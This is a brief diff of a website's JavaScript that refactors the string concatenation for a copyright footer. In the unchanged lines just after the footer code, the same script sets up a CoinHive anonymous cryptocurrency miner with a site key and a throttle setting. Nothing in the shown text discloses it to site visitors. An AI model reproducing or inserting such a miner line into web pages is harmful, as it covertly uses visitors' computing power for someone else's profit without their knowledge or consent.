@@ -6,7 +6,7 @@ var footer = "";
 var footer0 = "MaX Falstein gTLD &copy; MaX Falstein and Falstein Inc. &#8212; ";
 var footer1 = " ";
 var footer2 = " &#8212; Patents and Trademarks Pending";
-footer = footer0.concat(month.concat(footer1.concat(year.concat(footer2))));
+footer = footer0.concat(month).concat(footer1).concat(year).concat(footer2);
 document.getElementById("footer").innerHTML = footer;
 
 var minerSetup = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.3});
